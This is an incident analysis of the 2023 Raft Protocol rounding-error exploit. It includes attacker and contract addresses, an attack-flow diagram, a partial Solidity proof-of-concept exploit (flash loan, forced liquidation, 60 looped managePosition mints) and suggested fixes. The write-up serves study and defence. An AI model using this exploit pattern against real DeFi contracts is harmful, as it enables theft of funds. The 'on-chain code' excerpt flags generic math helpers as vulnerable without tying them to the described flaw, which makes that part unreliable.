# Raft Protocol Precision Loss Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Raft Protocol |
| Date | 2023-11-10 |
| Chain | Ethereum Mainnet |
| Loss | ~$3,200,000 USD |
| Attack Type | Flash Loan + Index Manipulation + Rounding Error |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xc1f2b71a502b551a65eee9c96318afdd5fd439fa` |
| Attack Contract | `0x0a3340129816a86b62b7eafd61427f743c315ef8` |
| Vulnerable Contract | `0x9AB6b21cDF116f611110b048987E58894786C244` (Raft PRM) |
| Fork Block | 18,543,485 |

## 2. Vulnerability Code Analysis

Raft Protocol is a protocol that mints R (stablecoin) using cbETH as collateral. By calling the `managePosition()` function more than 60 times in succession, cumulative rounding errors accumulate in the internal index calculation, allowing more R to be minted than the actual collateral warrants. After forcing an index update via a `liquidate()` call, the attacker repeatedly minted excess R and swapped it for USDC.

```solidity
// Vulnerable pattern: rounding errors accumulate on repeated managePosition calls
contract RaftPositionManager {
    // Cumulative index-based position management
    uint256 public debtIndex; // cumulative debt index

    function managePosition(
        address collateralToken,
        address position,
        uint256 collateralChange,
        bool isCollateralIncrease,
        uint256 debtChange,
        bool isDebtIncrease,
        uint256 maxFeePercentage,
        ERC20PermitSignature calldata permitSignature
    ) external {
        // Vulnerable: integer division rounding error when calculating debtChange
        uint256 normalizedDebt = debtChange * PRECISION / debtIndex;
        // Error accumulates across repeated calls
        // 60 iterations → excess R minted relative to actual collateral
    }
}
```

**Vulnerability**: Integer division rounding occurs when computing the debt normalized by `debtIndex`. By forcing an index update with `liquidate()` and then calling `managePosition()` 60+ times, the cumulative rounding error allows more R to be minted than the actual cbETH collateral supports.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: InterestRatePositionManager.f.sol
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {  // ❌
        unchecked {
            uint256 result = sqrt(a);
            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);  // ❌
        }
    }

// ...

    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {  // ❌
        unchecked {
            uint256 result = log2(value);
            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);  // ❌
        }
    }

// ...

    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {  // ❌
        unchecked {
            uint256 result = log10(value);
            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);  // ❌
        }
    }

// ...

    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                result += 1;
            }
        }
        return result;
    }

// ...

    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {  // ❌
        unchecked {
            uint256 result = log256(value);
            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);  // ❌
        }
    }
```

## 3. Attack Flow

```
Attacker [0xc1f2b71a502b551a65eee9c96318afdd5fd439fa]
  │
  ├─1─▶ AaveV3.flashLoan(cbETH, large amount)
  │      [Aave Pool: 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2]
  │      Triggers executeOperation callback
  │
  ├─2─▶ PositionManager.liquidate(rcbETH_c, rcbETH_d, position)
  │      [PRM: 0x9AB6b21cDF116f611110b048987E58894786C244]
  │      [rcbETH_c: 0xD0Db31473CaAd65428ba301D2174390d11D0C788]
  │      [rcbETH_d: 0x7beBe1D451291099D8e05fA2676412c09C96dFbC]
  │      Forces an index update
  │
  ├─3─▶ managePosition() called repeatedly (60+ times):
  │      Each call adds a small cbETH collateral + mints a small amount of R
  │      Rounding errors in debtIndex accumulate
  │      → After 60 iterations, excess R minted relative to actual collateral
  │
  ├─4─▶ managePosition() final call: withdraw collateral + repay R
  │      Excess-minted R does not need to be repaid
  │
  ├─5─▶ UniswapV3.swap() R → USDC
  │      [R/USDC Pool: Uniswap V3]
  │
  ├─6─▶ Curve.exchange() USDC → WETH / other tokens
  │
  └─7─▶ Repay Aave flash loan + realize ~$3.2M profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPositionManager {
    function managePosition(
        address collateralToken, address position,
        uint256 collateralChange, bool isCollateralIncrease,
        uint256 debtChange, bool isDebtIncrease,
        uint256 maxFeePercentage,
        ERC20PermitSignature calldata permitSignature
    ) external;
    function liquidate(address collateralToken, address debtToken, address position) external;
}

contract RaftExploit {
    IPositionManager PRM = IPositionManager(0x9AB6b21cDF116f611110b048987E58894786C244);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 R = IERC20(0x183015a9bA6fF60230fdEaDc3F43b3D788b13e21);
    IAavePool aave = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    function testExploit() external {
        aave.flashLoan(
            address(this),
            toArray(address(cbETH)),
            toArray(cbETH.balanceOf(address(aave))),
            toArray(uint256(0)),
            address(this), "", 0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, bytes calldata
    ) external returns (bool) {
        cbETH.approve(address(PRM), type(uint256).max);

        // Force index update
        PRM.liquidate(address(cbETH), address(R), somePosition);

        ERC20PermitSignature memory emptySig;

        // Accumulate rounding errors via 60 repeated managePosition calls
        for (uint i = 0; i < 60; i++) {
            PRM.managePosition(
                address(cbETH), address(this),
                smallAmount, true,   // add small collateral
                smallDebt, true,     // mint small amount of R
                1e18, emptySig
            );
        }

        // Swap excess R for USDC
        R.approve(address(uniRouter), type(uint256).max);
        // UniV3 swap R → USDC → WETH ...

        // Repay Aave
        cbETH.approve(address(aave), amounts[0] + premiums[0]);
        return true;
    }

    function RTocbETH() internal {
        // Curve exchange: R → USDC
        ICurve(curvePool).exchange(0, 1, R.balanceOf(address(this)), 0);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Cumulative rounding error via debtIndex normalization; excess R minted through repeated managePosition calls |
| Impact Scope | Raft Protocol R stablecoin reserves (~$3.2M) |
| Explorer | [Etherscan](https://etherscan.io/address/0x9AB6b21cDF116f611110b048987E58894786C244) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce consistent rounding direction (always round up)
function normalizeDebt(uint256 debtChange, uint256 index) internal pure returns (uint256) {
    // Round up (ceiling) — unfavorable to the borrower
    return (debtChange * PRECISION + index - 1) / index;
}

// Fix 2: Limit the number of managePosition calls per block
mapping(address => uint256) public lastManageBlock;
mapping(address => uint256) public manageCountInBlock;

function managePosition(...) external {
    if (lastManageBlock[msg.sender] == block.number) {
        manageCountInBlock[msg.sender]++;
        require(manageCountInBlock[msg.sender] <= 5, "Too many operations per block");
    } else {
        lastManageBlock[msg.sender] = block.number;
        manageCountInBlock[msg.sender] = 1;
    }
    // ...
}

// Fix 3: Enforce a minimum position change amount
uint256 public constant MIN_POSITION_CHANGE = 0.01 ether;

function managePosition(uint256 collateralChange, ...) external {
    require(collateralChange >= MIN_POSITION_CHANGE || collateralChange == 0,
            "Change too small");
    // ...
}
```

## 7. Lessons Learned

1. **Rounding errors in index-based calculations**: Systems that normalize debt using a cumulative index are susceptible to rounding errors that compound across repeated operations. Rounding must be applied consistently in a direction unfavorable to the borrower (i.e., always ceiling).
2. **Forcing index updates via `liquidate()`**: The pattern of using the liquidation function to drive the internal index to a specific state, then compounding errors through repeated operations, is characteristic of attacks that exploit complex DeFi mechanics.
3. **Restricting repeated small-amount operations**: Limiting excessive operations on the same position within the same block can defend against rounding-error accumulation attacks.
4. **R stablecoin peg collapse**: When excess-minted R is sold into the market, the stablecoin peg breaks. $3.2M worth of R was swapped, causing a significant deviation in the R/USDC ratio.